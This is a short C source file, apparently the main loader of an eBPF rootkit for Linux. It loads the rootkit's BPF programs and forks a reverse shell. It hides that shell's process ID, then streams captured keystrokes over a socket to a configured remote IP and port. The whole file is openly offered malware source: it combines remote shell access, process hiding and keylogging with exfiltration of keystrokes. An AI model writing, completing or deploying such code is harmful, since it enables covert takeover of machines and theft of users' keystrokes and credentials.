#include <linux/types.h>
#include <bpf/libbpf.h>
#include <stdio.h>
#include <errno.h>
#include "userspace/rootkit_loader.h"
#include "userspace/reverse_shell.h"
#include "userspace/keylogger_processor.h"
#include "userspace/hider.h"
#include "config.h"
#include "rootkit.skel.h"

int main()
{
    struct rootkit *skel;

    skel = load_rootkit();
    if (!skel)
        return -EINVAL;

    pid_t reverse_shell_pid = fork();
	if (reverse_shell_pid < 0) {
        int err = errno;
		perror("Fork failed");
		return -err;
	}

	if (reverse_shell_pid == 0) {
		run_reverse_shell();
    } else if (reverse_shell_pid > 0) {
        hider_hide_pid(reverse_shell_pid);
    }

    struct keylogger_ctx ctx = {
        .keylogger_socket_fd = init_keylogger_sender_socket(REMOTE_IP, KEYLOGGER_PORT),
    };

    struct ring_buffer *rb = ring_buffer__new(bpf_map__fd(skel->maps.keylog_events), process_key_event, &ctx, NULL);
    while (1) {

        if (ctx.keylogger_socket_fd < 0)
            ctx.keylogger_socket_fd = init_keylogger_sender_socket(REMOTE_IP, KEYLOGGER_PORT);

        ring_buffer__poll(rb, 100);
    }

    unload_rootkit(skel);

    return 0;
}